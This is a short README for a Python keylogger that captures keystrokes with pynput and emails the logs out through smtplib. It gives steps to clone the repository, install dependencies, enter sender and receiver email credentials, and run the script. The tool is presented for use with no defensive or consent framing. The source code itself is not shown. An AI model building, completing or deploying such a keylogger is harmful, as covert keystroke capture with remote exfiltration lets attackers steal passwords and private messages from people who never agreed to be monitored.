# Keylogger

A lightweight and simple keylogger built with Python, using pynput to capture keystrokes and smtplib to send logs via email.

Setup:
  Clone the repository:
    git clone https://github.com/RaviRajGhorsai/Simple-Keylogger.git
    cd Simple-Keylogger

Install dependencies:
  pip install pynput

Edit your credentials:
  Open the Python file and update:
    sender_email
    receiver_email
    password (use an App Password if you have 2FA enabled)

Run the keylogger:
  python keylogger.py
